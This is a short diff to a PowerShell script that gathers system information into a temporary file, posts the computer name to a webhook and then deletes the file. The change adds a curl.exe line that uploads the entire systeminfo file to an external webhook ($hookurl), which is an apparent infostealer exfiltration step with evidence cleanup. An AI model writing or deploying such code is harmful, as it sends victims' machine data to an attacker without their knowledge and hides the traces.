@@ -110,10 +110,10 @@ $outpath = "$env:temp\systeminfo.txt"
 
 
 $Pathsys = "$env:temp\systeminfo.txt"
-$msgsys = Get-Content -Path $Pathsys -Raw 
-$escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+$escmsgsys = "SYSTEM INFO"
 $jsonsys = @{"username" = "$env:COMPUTERNAME" 
             "content" = $escmsgsys} | ConvertTo-Json
 Start-Sleep 1
 Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
+curl.exe -F file1=@"$Pathsys" $hookurl
 Remove-Item -Path $Pathsys -force
